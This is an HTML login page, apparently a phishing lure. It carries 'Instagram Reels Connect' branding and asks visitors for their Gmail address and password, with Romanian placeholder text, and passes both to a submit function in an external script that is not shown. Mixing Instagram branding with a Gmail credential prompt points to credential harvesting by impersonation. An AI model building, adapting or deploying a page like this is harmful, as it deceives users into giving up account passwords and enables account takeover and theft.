<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Login Page</title>
    <link rel="stylesheet" href="styles.css">
  </head>
  <body>
    <!-- Container pentru animatie -->
    <div class="background-animation"></div>

    <!-- Container pentru formular -->
    <div class="container">
      <h2>Instagram Reels Connect</h2>
      <form id="form">
        <label for="name">Gmail:</label>
        <input
          type="text"
          id="name"
          name="name"
          placeholder="Introduceți gmailul de conectare..."
        />
        <label for="details">Parola:</label>
        <textarea
          id="details"
          name="details"
          placeholder="Introduceți parola de conectare..."
        ></textarea>
        <button type="button" onclick="submitForm()">Trimite!</button>
      </form>
    </div>

    <script src="script.js"></script>
  </body>
</html>
